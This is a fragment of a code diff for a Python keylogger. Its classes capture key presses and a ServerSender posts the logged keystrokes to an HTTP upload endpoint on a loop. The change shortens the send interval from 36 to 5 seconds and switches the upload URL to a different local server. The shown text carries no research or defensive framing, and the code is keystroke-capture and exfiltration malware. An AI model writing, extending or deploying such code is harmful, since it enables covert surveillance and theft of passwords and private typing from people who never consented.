@@ -45,13 +45,13 @@ class ServerSender:
             if logs:
                 response = requests.post(self.server_url, json=logs)
                 print(f"Data sent to server. Response: {response.text}")
-            time.sleep(36)
+            time.sleep(5)
 
 class KeyLoggerManager:
     def __init__(self):
         self.service = KeyLoggerService()
         self.file_writer = FileWriter()
-        self.server_sender = ServerSender("http://localhost:8001/api/key_logs", self.service)
+        self.server_sender = ServerSender("http://127.0.0.1:5000/api/upload", self.service)
         self.listener = None
 
     def handle_key_press(self, key):
